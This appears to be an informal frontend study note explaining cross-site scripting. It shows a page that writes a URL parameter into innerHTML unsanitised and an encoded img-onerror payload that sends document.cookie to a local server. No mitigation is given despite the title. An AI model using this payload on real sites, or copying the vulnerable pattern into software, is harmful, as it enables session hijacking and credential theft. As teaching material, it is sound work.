# Design : FrontEnd


#### XSS:
**Cross site scripting: How to avoid?? What is it??**

suppose you have your website called "mango.com", If some hacker can able to inject piece of code or script from outside (externally from n number of places) and the hacker can able to stole the confidential information then you just fucked up. Now website current user is a victim, The data of that user is no more secure.(Account details and credentials are no longer secure now).User session hijacking (your cookie got leaked).

**Vulnarabilities:**

  1.User session hijacking: (Like the cookie got leaked)
  
  2.UnAuthorised activiy :
  
  3.capturing Keystrokes: (Somehas has injected a script to know what you are typing)
  
  4.Stealing critical Information: (Capturing DOM directly)
  
  5.Phishing attack:

**With XSS these vulnarabilities might be direct threat to your secured data.**

Simple Example::(Codes)

```js
<script>
    const param=new URLSearchParams(window.location.search);
    const name=param.get('name');
    document.getElementById('username').innerHTML=name
</script>
```

here we are just picking the query params. we are reading the name from q params. How this leads to the issues then???? Lets check. 
along with the same we'll set some cookies simply. (It set from server but for example we are doin it from frontend)

```js
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1 id="username">Hello</h1>
</body>
<script>
    function setCookies(name, value, ttl){
        const d=new Date();
        d.setTime(d.getTime()+(ttl+24*60));
        const expireon="expires "+ d.toUTCString();
        document.cookie=name+"="+value+"::"+expireon;
    }
    setCookies("Cookie name","vookie values",new Date().getDate());
</script>
<script>
    const param=new URLSearchParams(window.location.search);
    const name=param.get('name');
    document.getElementById('username').innerHTML=name
</script>
</html>
```

Now run it with live server.Now while passing the query params ,manupulate the url.

Passing simple query paramaters.
```js
http://127.0.0.1:5500/index.html?name=%22saurabh%22
```

Manupulating the URL:

```
'?name=<img src="does-not-exist" onerror="var img=document.createElement(\'img\'); img.src=\'http://127.0.0.1:5500/cookie?data=\'+ document.cookie; document.querySelector(\'body\').appendChild(img);">'

```
In previous days you can directly add a script to the query params but the browsers can detect it easily so this using image tag is a hack. If src is not exist in img tag it'll run onerror code...try running this code.
And make sure the URL is encoded:

use: encodeURIComponent is the browers api.

```js
encodeURIComponent('?name=<img src="does-not-exist" onerror="var img=document.createElement(\'img\'); img.src=\'http://127.0.0.1:5500/cookie?data=\'+ document.cookie; document.querySelector(\'body\').appendChild(img);">')
```

then pass it as a query param:

```js
localhost:<port>?<encoded uri given above>
```
